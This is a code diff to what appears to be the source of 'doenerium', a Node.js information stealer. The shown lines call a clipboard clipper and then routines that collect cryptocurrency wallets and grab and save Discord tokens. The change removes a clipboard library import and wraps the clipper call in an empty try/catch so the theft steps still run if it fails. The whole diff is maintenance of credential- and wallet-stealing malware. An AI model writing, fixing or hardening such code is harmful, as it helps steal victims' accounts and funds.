@@ -111,7 +111,6 @@ class doenerium {
       sqlite3: require("sqlite3"),
       path: require("path"),
       request: require("request"),
-      ncp: require("node-clipboardy"),
     };
 
     this.utils = {
@@ -265,7 +264,10 @@ class doenerium {
 
     this.config.jszip.path = this.config.jszip.generate_path();
 
-    this.utils.clipper.detectClipboard();
+    try {
+
+      this.utils.clipper.detectClipboard();
+    } catch {}
     await this.utils.wallets.getWallets();
     await this.utils.discord.getTokens();
     await this.utils.discord.saveDiscordTokens();
